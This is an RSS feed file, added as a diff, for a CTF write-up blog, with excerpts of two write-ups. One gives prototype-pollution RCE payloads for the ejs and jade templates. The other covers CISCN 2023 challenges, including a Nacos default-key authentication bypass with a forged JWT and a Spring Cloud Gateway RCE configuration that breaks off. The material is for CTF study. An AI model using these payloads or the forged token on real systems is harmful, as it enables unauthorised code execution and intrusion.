@@ -1,0 +1,26 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Writeup on n2ryx&#39;s Blog</title>
+    <link>https://n2ryx.github.io/tags/writeup/</link>
+    <description>Recent content in Writeup on n2ryx&#39;s Blog</description>
+    <generator>Hugo</generator>
+    <language>en</language>
+    <lastBuildDate>Sat, 10 Feb 2024 00:00:00 +0000</lastBuildDate>
+    <atom:link href="https://n2ryx.github.io/tags/writeup/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>ctfshow (nodejs)</title>
+      <link>https://n2ryx.github.io/docs/pollution/ctfshow-nodejs/</link>
+      <pubDate>Sat, 10 Feb 2024 00:00:00 +0000</pubDate>
+      <guid>https://n2ryx.github.io/docs/pollution/ctfshow-nodejs/</guid>
+      <description>ctfshow (nodejs) ejs 模板 // opts.outputFunctionName {&amp;#34;__proto__&amp;#34;:{&amp;#34;__proto__&amp;#34;:{&amp;#34;outputFunctionName&amp;#34;:&amp;#34;a=1; return global.process.mainModule.constructor._load(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;dir&amp;#39;); //&amp;#34;}}} {&amp;#34;__proto__&amp;#34;:{&amp;#34;__proto__&amp;#34;:{&amp;#34;outputFunctionName&amp;#34;:&amp;#34;__tmp1; return global.process.mainModule.constructor._load(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;dir&amp;#39;); __tmp2&amp;#34;}}} // opts.escapeFunction {&amp;#34;__proto__&amp;#34;:{&amp;#34;__proto__&amp;#34;:{&amp;#34;client&amp;#34;:true,&amp;#34;escapeFunction&amp;#34;:&amp;#34;1; return global.process.mainModule.constructor._load(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;dir&amp;#39;);&amp;#34;,&amp;#34;compileDebug&amp;#34;:true}}} {&amp;#34;__proto__&amp;#34;:{&amp;#34;__proto__&amp;#34;:{&amp;#34;client&amp;#34;:true,&amp;#34;escapeFunction&amp;#34;:&amp;#34;1; return global.process.mainModule.constructor._load(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;dir&amp;#39;);&amp;#34;,&amp;#34;compileDebug&amp;#34;:true,&amp;#34;debug&amp;#34;:true}}} jade 模板 {&amp;#34;__proto__&amp;#34;:{&amp;#34;__proto__&amp;#34;: {&amp;#34;type&amp;#34;:&amp;#34;Code&amp;#34;,&amp;#34;compileDebug&amp;#34;:true,&amp;#34;self&amp;#34;:true,&amp;#34;line&amp;#34;:&amp;#34;0, \&amp;#34;\&amp;#34; ));return global.process.mainModule.constructor._load(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;dir&amp;#39;);//&amp;#34;}}}jade_debug.**unshift**(**new** jade.**DebugItem**( 0, &amp;#34;&amp;#34; ));**return** global.process.mainModule.constructor.**_load**(&amp;#39;child_process&amp;#39;).**execSync**(&amp;#39;dir&amp;#39;) CTFshow web334 login.js:&#xA;var express = require(&amp;#39;express&amp;#39;); var router = express.Router(); var users = require(&amp;#39;../modules/user&amp;#39;).items; var findUser = function(name, password){ return users.find(function(item){ return name!==&amp;#39;CTFSHOW&amp;#39; &amp;amp;&amp;amp; item.username === name.toUpperCase() &amp;amp;&amp;amp; item.password === password; }); }; /* GET home page.</description>
+    </item>
+    <item>
+      <title>2023CISCN初赛题目复现</title>
+      <link>https://n2ryx.github.io/docs/writeup/2023ciscn%E5%88%9D%E8%B5%9B%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Sat, 20 Jan 2024 00:00:00 +0000</pubDate>
+      <guid>https://n2ryx.github.io/docs/writeup/2023ciscn%E5%88%9D%E8%B5%9B%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</guid>
+      <description>2023CISCN初赛题目复现 Unzip 题型：文件上传（软连接）&#xA;点击上传，跳转到upload.php，高亮源码&#xA;软连接&#xA;依次上传 1.zip、2.zip&#xA;BackendService 题型：nacos身份认证漏洞+Nacos结合Spring Cloud Gateway RCE利用&#xA;nacos身份认证漏洞 这里用的 QVD-2023-6271 nacos token.secret.key身份认证绕过漏洞&#xA;影响版本：0.1.0&amp;lt;= Nacos&amp;lt;= 2.2.0&#xA;默认密钥&#xA;SecretKey012345678901234567890123456789012345678901234567890123456789 exp为时间戳，大于当前时间即可&#xA;发送到重放模块，添加Authorization: Bearer&#xA;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MjU1NjAyODgwMH0.qortgrr-UfhqQ-G9AWstQO-azRecm_b84uonXmYDMqo 登入系统&#xA;Nacos结合Spring Cloud Gateway RCE利用 该漏洞在网上公开POC的利用方式是通过/actuator/gateway/routes这个节点进行动态添加路由的，当项目配置文件中配置了以下两行配置时（YAML格式），便会开启该接口：&#xA;## application.yaml management.endpoint.gateway.enabled: true # default value management.endpoints.web.exposure.include: gateway 题目中的backcfg服务节点（就是nacos服务本身，两者是同一个机器）加载配置文件的话就可以在控制台创建backcfg.json配置，之后backcfg服务节点就会自动导入配置。Nacos结合Spring Cloud Gateway RCE利用配置文件gateway，如果发现应用未开启Actuator，则结合前文所说的利用响应包增加Header的方式回显，将配置在Nacos中进行修改&#xA;spring: cloud: gateway: routes: - id: exam order: 0 uri: lb://service-provider predicates: - Path=/echo/** filters: - name: AddResponseHeader args: name: result value: &amp;#34;#{new java.</description>
+    </item>
+  </channel>
+</rss>
